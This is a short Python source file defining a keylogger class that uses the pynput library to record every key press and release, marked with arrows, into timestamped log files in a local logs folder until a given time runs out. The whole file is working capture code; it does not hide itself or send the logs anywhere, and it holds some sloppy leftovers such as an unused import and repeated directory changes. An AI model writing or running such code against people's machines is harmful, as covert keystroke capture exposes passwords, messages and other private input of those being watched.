from itertools import filterfalse
from pynput import keyboard
from pynput.keyboard import Listener
from os import chdir
from time import strftime, time


class keylogger(object):
    def __init__(self, giventime):
        self.logname = "log{}.txt".format(strftime("%H-%M-%S"))
        self.giventime = float(giventime)
        self.starttime = time()
        self.endtime = self.starttime + self.giventime
        self.finished = False

    def on_press(self, key):
        
        try:
            key.char        # Intercept if key is special
            str(key)
        except AttributeError:
            key = str(key)
            key = key[4:]   #   Remove "Key." from print
        key = "↑{0}".format(key)
        _ = self.noteitdown(key)
        chdir("..\\")
        if _ == False:
            return False
    def on_release(self, key):
        key = str(key).replace("'", "")
        if "key." in key.lower():
            key = key[4:]   #   Remove "Key." from print
        key = "↓{0}".format(key)
        _ = self.noteitdown(key)
        chdir("..\\")
        if _ == False:
            return False
        
 
    def start(self):
        with Listener(
            on_press=self.on_press,
            on_release=self.on_release) as self.listener:
            self.listener.join()
    
    def noteitdown(self, key):
        if time() > self.endtime:
            self.finished = True
            self.logname = ".\\logs\\{}".format(self.logname)
            return False
        chdir(".\\logs\\")
        with open(self.logname, "a", encoding="utf-8") as file:
            file.write(key)
            file.write(" ")
            file.close()
        return True
    